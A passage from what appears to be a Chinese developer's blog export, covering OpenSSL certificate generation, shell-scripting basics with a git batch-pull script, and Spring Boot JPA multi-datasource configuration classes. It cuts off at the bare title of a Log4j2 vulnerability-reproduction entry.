<h2 id="Openssl生成证书"><a href="#Openssl生成证书" class="headerlink" title="Openssl生成证书"></a>Openssl生成证书</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">说明：key-私钥；csr-证书签名请求；crt-证书；这里均采用PEM证书，而不是DER证书，与后缀名无关。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成CA证书私钥(key)</span></span><br><span class="line">openssl genrsa -out ca.key 4096</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成CA自签署证书(crt)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openssl req -new -x509 -days 3650 -key ca.key -out ca.crt</span></span><br><span class="line">openssl req -new -x509 -days 3650 -subj &quot;/C=CN/ST=GD/L=GZ/O=org/OU=orgUnit/CN=harbor.loc&quot; -key ca.key -out ca.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#############################################################################</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成服务器证书私钥(key)</span></span><br><span class="line">openssl genrsa -out server.key 4096</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成服务器证书签名请求(csr)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openssl req -new -key server.key -out server.csr</span></span><br><span class="line">openssl req -new -subj &quot;/C=CN/ST=GD/L=GZ/O=org/OU=orgUnit/CN=harbor.loc&quot; -key server.key -out server.csr</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成服务器证书(crt)</span></span><br><span class="line">openssl x509 -req -days 3650 -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt</span><br></pre></td></tr></table></figure>

<h1 id="8-Shell"><a href="#8-Shell" class="headerlink" title="8. Shell"></a>8. Shell</h1><h2 id="8-1-基础命令"><a href="#8-1-基础命令" class="headerlink" title="8.1 基础命令"></a>8.1 基础命令</h2><h3 id="1）变量"><a href="#1）变量" class="headerlink" title="1）变量"></a>1）变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量类型：</span><br><span class="line">- 局部变量：仅在当前进程使用，如：name=&quot;Tom&quot;；</span><br><span class="line">- 全局变量（环境变量）：可在当前进程及其子孙进程使用，在子孙中修改的值不会影响父进程的值，如：export name=&quot;Tom&quot;；</span><br><span class="line">- 常量：仅可读，不能改、删，在进程退出时销毁，如：readonly name=&quot;Tom&quot;；</span><br><span class="line">unset name	删除变量name，用完可删除，养成好习惯</span><br><span class="line">set			查看所有变量</span><br><span class="line">export		查看所有环境变量，等效于declare -x</span><br><span class="line">readonly	查看所有常量，等效于declare -r</span><br><span class="line"></span><br><span class="line">====================================== 特殊符号 ======================================</span><br><span class="line">&#x27;&#x27;和&quot;&quot;	- 两者都是用来处理变量值包含空格的问题。不同的是，单引号会把所有字符当普通字符进行输出，而双引号会处理参数替换$和命令替换``。</span><br><span class="line">$&#123;&#125;	- 参数替换，其后不紧跟着其它字符时可省略&#123;&#125;，echo $name输出变量name的值，不加$则直接把name当字符串进行输出。参数-e为开启转义。</span><br><span class="line">``	- 命令替换，echo `wc -l`输出的是命令wc -l的执行结果。</span><br><span class="line">$()	- 命令替换，与符号``类似，$()支持嵌套，但其仅在Bash Shell中有效，而``可在多种Shell中使用。</span><br><span class="line">()	- 用来开启一个子shell，执行完后返回父shell，常用于一次性的命令，与bash开启子进程不同的是，()可以在括号里获取外面局部变量的值，进程号和外面的也一样。</span><br><span class="line">&#123;&#125;	- 在当前shell执行，影响当前的环境，最后一个命令需要加分号。</span><br></pre></td></tr></table></figure>

<h3 id="2）bash进程"><a href="#2）bash进程" class="headerlink" title="2）bash进程"></a>2）bash进程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -n xxx.sh		检测语法错误，命令错误检测不了</span><br><span class="line">bash -x xxx.sh		跟踪命令的执行</span><br><span class="line">bash		开启新的进程</span><br><span class="line">exit [n]	退出命令并返回状态码n</span><br><span class="line">命令c &amp;&gt; /dev/null	不显示输出结果，从而使用echo $?判断执行成功或失败</span><br><span class="line">echo $?		查看前一条命令执行的状态码，0：成功，1-255：失败</span><br><span class="line">echo $$		$$查看当前进程的进程编号</span><br><span class="line">echo $PPID	$PPID父进程的进程编号</span><br><span class="line">sleep n		当前进程睡眠n秒</span><br><span class="line">read		标准输入，等待用户输入，-p输入提示文字，-n输入字符长度限制，-t输入限时，-s隐藏输入内容</span><br><span class="line">pstree -p	查看进程的父子关系，yum list|grep pstree为空的原因，由于pstree在psmisc中，需要先安装yum install -y psmisc</span><br><span class="line">scp t/ test@192.168.22.12:/home/test/	远程复制，把t/目录复制到192.168.22.12的test用户的/home/test/目录下</span><br><span class="line">ls | wc -l	查看当前目录下的文件、目录总数量</span><br></pre></td></tr></table></figure>

<h3 id="3）获取用户id"><a href="#3）获取用户id" class="headerlink" title="3）获取用户id"></a>3）获取用户id</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | head -10 | tail -1 | cut -d&#x27;:&#x27; -f3	获取第10位用户的id，cut的参数：-d分隔符，-f分割后的第几段</span><br><span class="line">cat /etc/passwd | sed -n &quot;10p&quot; | cut -d&#x27;:&#x27; -f3			效果同上</span><br><span class="line"></span><br><span class="line">cat /etc/passwd | grep &quot;Tom&quot; | cut -d&#x27;:&#x27; -f3			获取用户Tom的id</span><br><span class="line">cat /etc/passwd | grep &quot;Tom&quot; | awk -F&#x27;:&#x27; &#x27;&#123;print $3&#125;&#x27;	效果同上</span><br></pre></td></tr></table></figure>

<h3 id="4）命令的位置参数"><a href="#4）命令的位置参数" class="headerlink" title="4）命令的位置参数"></a>4）命令的位置参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $N		获取命令的第N个参数，N大于9时需要加上&#123;&#125;，例如：echo $&#123;10&#125;，而echo $10表示第1个参数与字符串0进行拼接</span><br><span class="line">echo $0		命令的第0个参数是命令（或命令软链接）的名称，可以通过echo `basename $0`仅获取命令名称（不包含路径）</span><br><span class="line">echo $*		获取所有参数（合并成一个字符串），$#获取参数个数</span><br><span class="line">echo $@		获取所有参数（每个参数为一个独立字符串），与$*类似，只有加双引号才有区别</span><br><span class="line">set --		清空所有位置参数</span><br><span class="line">shift		将参数往左移动1位，可以加数字，如shift 2，参数向左移动2位</span><br></pre></td></tr></table></figure>

<h3 id="5）算术运算与数组"><a href="#5）算术运算与数组" class="headerlink" title="5）算术运算与数组"></a>5）算术运算与数组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let			做加减乘除运算等，例如：let k=i+j</span><br><span class="line">$[]			做加减乘除运算等，例如：k=$[i+j]</span><br><span class="line">$(())		与$[]类似，例如：k=$((i+j))</span><br><span class="line"></span><br><span class="line">arr=(a b c)			数组定义</span><br><span class="line">echo $&#123;arr[i]&#125;		输出数组某个元素</span><br><span class="line">echo $&#123;arr[*]&#125;		输出数组所有元素，等效于$&#123;arr[@]&#125;</span><br><span class="line">echo $&#123;#arr[*]&#125;		输出数组长度，等效于$&#123;#arr[@]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="6）标准输入、标准输出、标准错误输出"><a href="#6）标准输入、标准输出、标准错误输出" class="headerlink" title="6）标准输入、标准输出、标准错误输出"></a>6）标准输入、标准输出、标准错误输出</h3><p>标准输入（stdin），文件描述符为0；标准输出（stdout），文件描述符为1；标准错误输出（stderr），文件描述符为2。文件<code>/dev/null</code>可以看作Linux中的“无底洞“，通常把不需要的输出重定向到该文件进行丢弃。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">标准输入重定向，其中文件描述符0可省略</span></span><br><span class="line">command 0&lt; file</span><br><span class="line">command &lt; file</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">标准输出重定向，其中文件描述符1可省略</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">覆盖</span></span><br><span class="line">command 1&gt; file</span><br><span class="line">command &gt; file</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">追加</span></span><br><span class="line">command 1&gt;&gt; file</span><br><span class="line">command &gt;&gt; file</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">标准错误输出重定向，文件描述符2不能省略</span></span><br><span class="line">command 2&gt; file			# 覆盖</span><br><span class="line">command 2&gt;&gt; file		# 追加</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把标准输出重定向到文件，并把标准错误输出重定向到与标准输出一样，即标准输出和标准错误输出都重定向到文件</span></span><br><span class="line">command &gt; file 2&gt;&amp;1		# 覆盖</span><br><span class="line">command &gt;&gt; file 2&gt;&amp;1	# 追加</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把标准输入重定向到file1，标准输出重定向到file2，相当于file1作为<span class="built_in">command</span>的入参，file2作为<span class="built_in">command</span>结果的保存文件</span></span><br><span class="line">command &lt; file1 &gt; file2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.文件描述符（0、1、2）与重定向符之间不能有空格；</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.文件描述符（0、1、2）在重定向符右侧时，需要加&amp;，比如2&gt;&amp;1表示标准错误输出重定向到与标准输出的一样；</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：往文件中写入多行内容</span></span><br><span class="line">cat &lt;&lt;&#x27;EOF&#x27;&gt; a.txt</span><br><span class="line">123</span><br><span class="line">abc</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<h2 id="8-2-条件判断与循环"><a href="#8-2-条件判断与循环" class="headerlink" title="8.2 条件判断与循环"></a>8.2 条件判断与循环</h2><p>注：作用域由对齐方式确定。</p>
<h3 id="1）if"><a href="#1）if" class="headerlink" title="1）if"></a>1）if</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span>模板，<span class="keyword">elif</span>和<span class="keyword">else</span>部分内容可省略。</span></span><br><span class="line">if condition1; then</span><br><span class="line">	command1</span><br><span class="line">elif condition2; then</span><br><span class="line">	command2</span><br><span class="line">else</span><br><span class="line">	command3</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">若要写在一行，则需要在每个执行的命令后加分号</span></span><br><span class="line">if [ &quot;$n1&quot; -gt &quot;$n2&quot; ]; then echo &quot;&gt;&quot;; echo &quot;&gt;&gt;&quot;; elif [ &quot;$n1&quot; -lt &quot;$n2&quot; ]; then echo &quot;&lt;&quot;; echo &quot;&lt;&lt;&quot;; else echo &quot;=&quot;; echo &quot;==&quot;;  fi</span><br></pre></td></tr></table></figure>

<p>条件中的数字比较和字符串比较区别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字比较：-eq（等于）、-ne（不等于）、-gt（大于）、-ge（大于等于）、-lt（小于）、-le（小于等于）</span><br><span class="line">- 可在[]、[[]]中使用，比较数字大小；</span><br><span class="line"></span><br><span class="line">字符串比较：=、==、!=、&gt;、&gt;=、&lt;、&lt;=，=与==比较字符串时等效</span><br><span class="line">- 在[]中使用时，比较字符串大小，&gt;和&lt;需要转义为\&gt;和\&lt;；</span><br><span class="line">- 在[[]]中使用时，也是比较字符串大小，但不需要转义，且支持||、&amp;&amp;、正则匹配，其中||和&amp;&amp;与其它语言一样有短路机制；</span><br><span class="line">- 在(())中使用时，只做数字比较，且不能使用运算符=；</span><br><span class="line"></span><br><span class="line">注：条件中的每一部分，前后必须留空格，比如：[ &quot;$a&quot; == &quot;$b&quot; ]、[[ $a == $b ]]、(( $a &gt;= $b ))，使用[]时，变量最好用双引号包裹住。</span><br></pre></td></tr></table></figure>

<p>常用的if参数（需要取反，则在if和[之间加上!，且!两侧需要留有空格）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 字符串参数</span><br><span class="line">-z		[ -z &quot;$a&quot; ]，字符串长度为0，则为真；</span><br><span class="line">-n		[ -n &quot;$a&quot; ]，字符串长度不为0，则为真；</span><br><span class="line"></span><br><span class="line"># 文件参数</span><br><span class="line">-e		[ -e file ]，若文件或目录存在，则为真；</span><br><span class="line">-r		[ -r file ]，若文件或目录存在且可读，则为真；</span><br><span class="line">-w		[ -w file ]，若文件或目录存在且可写，则为真；</span><br><span class="line">-x		[ -x file ]，若文件或目录存在且可执行，则为真；</span><br><span class="line">-s		[ -s file ]，若文件或目录存在且至少包含1个字符（注意空目录也是包含字符的），则为真；</span><br><span class="line">-d		[ -d file ]，若存在且是目录，则为真；</span><br><span class="line">-f		[ -f file ]，若存在且是普通文件，则为真；</span><br><span class="line">-c		[ -c file ]，若存在且是字符特殊文件，则为真；</span><br><span class="line">-b		[ -b file ]，若存在且是块特殊文件，则为真；</span><br></pre></td></tr></table></figure>

<h3 id="2）for和while"><a href="#2）for和while" class="headerlink" title="2）for和while"></a>2）for和while</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">for</span>模板</span></span><br><span class="line">for i in a b c</span><br><span class="line">do</span><br><span class="line">	command</span><br><span class="line">done</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">while</span>模板</span></span><br><span class="line">while condition</span><br><span class="line">do</span><br><span class="line">	command</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="8-3-函数"><a href="#8-3-函数" class="headerlink" title="8.3 函数"></a>8.3 函数</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通常只需要用<span class="built_in">echo</span>返回结果的方式，通过<span class="built_in">exit</span>退出函数即可</span></span><br><span class="line">test() &#123;</span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">返回方式1（<span class="built_in">echo</span>）</span></span><br><span class="line">	echo &#x27;函数名$0:&#x27;$0</span><br><span class="line">	echo &quot;---&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	# </span><span class="language-bash">返回方式2（<span class="built_in">return</span>），范围0~255的整数</span></span><br><span class="line">	return $(($1 + $2 + $3))</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取函数所有<span class="built_in">echo</span>的结果，结果是以空格隔开</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">res=`<span class="built_in">test</span> 1 4 7`</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取函数<span class="built_in">return</span>的结果，若两者混用，那么结果是所有<span class="built_in">echo</span>结果加<span class="built_in">return</span>结果，用空格隔开</span></span><br><span class="line">res=`test 1 4 7; echo $?`</span><br><span class="line"></span><br><span class="line">echo $res</span><br></pre></td></tr></table></figure>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="1）git-batch-sh"><a href="#1）git-batch-sh" class="headerlink" title="1）git-batch.sh"></a>1）git-batch.sh</h3><p>批量拉取当前目录下所有工程的最新代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">read -p &quot;Choose 1(status, default) or 2(pull): &quot; opt</span><br><span class="line">if [ &quot;$opt&quot; == &quot;2&quot; ]; then</span><br><span class="line">    opt=&quot;pull&quot;</span><br><span class="line">else</span><br><span class="line">    opt=&quot;status&quot;</span><br><span class="line">fi</span><br><span class="line">for dir in `ls`; do</span><br><span class="line">    if [ -d &quot;$dir&quot; ]; then</span><br><span class="line">        if [ -d &quot;$dir/.git&quot; ]; then</span><br><span class="line">            # -e解释转义字符，\033[背景颜色,字体颜色m字符串xxx\033[0m，表示对字符串xxx使用对应的背景颜色和字体颜色</span><br><span class="line">            echo -e &quot;\033[32m=============================================\033[0m&quot; &amp;&amp; cd &quot;$dir&quot; &amp;&amp; echo -e &quot;\033[35m$dir\033[0m&quot; &amp;&amp; git $opt &amp;&amp; cd ..</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo 按任意键退出</span><br><span class="line">read -n 1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>Jpa多数据源配置</title>
    <url>/2019/09/17/Jpa%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="1-DataSourceConfig-java"><a href="#1-DataSourceConfig-java" class="headerlink" title="1. DataSourceConfig.java"></a>1. DataSourceConfig.java</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.qa.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.jdbc.DataSourceBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Primary;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据源的配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;primaryDataSource&quot;)</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;primaryDataSource&quot;)</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix=&quot;spring.datasource.primary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">primaryDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> DataSourceBuilder.create().build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(name = &quot;secondaryDataSource&quot;)</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;secondaryDataSource&quot;)</span></span><br><span class="line">    <span class="meta">@ConfigurationProperties(prefix=&quot;spring.datasource.secondary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> DataSource <span class="title function_">secondaryDataSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> DataSourceBuilder.create().build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-PrimaryConfig-java"><a href="#2-PrimaryConfig-java" class="headerlink" title="2. PrimaryConfig.java"></a>2. PrimaryConfig.java</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.qa.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.orm.jpa.HibernateSettings;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.orm.jpa.JpaProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.orm.jpa.EntityManagerFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Primary;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.config.EnableJpaRepositories;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.jpa.JpaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.PlatformTransactionManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.EnableTransactionManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.EntityManager;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据源一</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@EnableJpaRepositories(</span></span><br><span class="line"><span class="meta">        entityManagerFactoryRef=&quot;entityManagerFactoryPrimary&quot;,</span></span><br><span class="line"><span class="meta">        transactionManagerRef=&quot;transactionManagerPrimary&quot;,</span></span><br><span class="line"><span class="meta">        basePackages= &#123; &quot;com.zhifei.qa.domain&quot; &#125;)</span>               <span class="comment">//设置Repository所在位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimaryConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;primaryDataSource&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> DataSource primaryDataSource;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JpaProperties jpaProperties;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;entityManagerPrimary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> EntityManager <span class="title function_">entityManager</span><span class="params">(EntityManagerFactoryBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entityManagerFactoryPrimary(builder).getObject().createEntityManager();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;entityManagerFactoryPrimary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> LocalContainerEntityManagerFactoryBean <span class="title function_">entityManagerFactoryPrimary</span> <span class="params">(EntityManagerFactoryBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder</span><br><span class="line">                .dataSource(primaryDataSource)</span><br><span class="line">                .properties(getVendorProperties())</span><br><span class="line">                .packages(<span class="string">&quot;com.zhifei.qa.domain&quot;</span>)                <span class="comment">//设置实体类所在位置</span></span><br><span class="line">                .persistenceUnit(<span class="string">&quot;primaryPersistenceUnit&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="meta">@Bean(name = &quot;transactionManagerPrimary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> PlatformTransactionManager <span class="title function_">transactionManagerPrimary</span><span class="params">(EntityManagerFactoryBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JpaTransactionManager</span>(entityManagerFactoryPrimary(builder).getObject());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">getVendorProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jpaProperties.getHibernateProperties(<span class="keyword">new</span> <span class="title class_">HibernateSettings</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="3-SecondaryConfig-java"><a href="#3-SecondaryConfig-java" class="headerlink" title="3. SecondaryConfig.java"></a>3. SecondaryConfig.java</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.qa.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.orm.jpa.HibernateSettings;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.orm.jpa.JpaProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.orm.jpa.EntityManagerFactoryBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.config.EnableJpaRepositories;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.jpa.JpaTransactionManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.PlatformTransactionManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.EnableTransactionManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.EntityManager;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 数据源2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@EnableJpaRepositories(</span></span><br><span class="line"><span class="meta">        entityManagerFactoryRef=&quot;entityManagerFactorySecondary&quot;,</span></span><br><span class="line"><span class="meta">        transactionManagerRef=&quot;transactionManagerSecondary&quot;,</span></span><br><span class="line"><span class="meta">        basePackages= &#123;&quot;com.zhifei.qa.repository&quot;&#125;)</span>               <span class="comment">//设置Repository所在位置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecondaryConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;secondaryDataSource&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> DataSource secondaryDataSource;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JpaProperties jpaProperties;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(name = &quot;entityManagerSecondary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> EntityManager <span class="title function_">entityManager</span><span class="params">(EntityManagerFactoryBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> entityManagerFactorySecondary(builder).getObject().createEntityManager();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(name = &quot;entityManagerFactorySecondary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> LocalContainerEntityManagerFactoryBean <span class="title function_">entityManagerFactorySecondary</span> <span class="params">(EntityManagerFactoryBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> builder</span><br><span class="line">                .dataSource(secondaryDataSource)</span><br><span class="line">                .properties(getVendorProperties())</span><br><span class="line">                .packages(<span class="string">&quot;com.zhifei.qa.entity&quot;</span>)               <span class="comment">//设置实体类所在位置</span></span><br><span class="line">                .persistenceUnit(<span class="string">&quot;primaryPersistenceUnit&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(name = &quot;transactionManagerSecondary&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> PlatformTransactionManager <span class="title function_">transactionManagerSecondary</span><span class="params">(EntityManagerFactoryBuilder builder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JpaTransactionManager</span>(entityManagerFactorySecondary(builder).getObject());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">getVendorProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> jpaProperties.getHibernateProperties(<span class="keyword">new</span> <span class="title class_">HibernateSettings</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Jpa</category>
      </categories>
      <tags>
        <tag>Jpa</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j2漏洞复现</title>
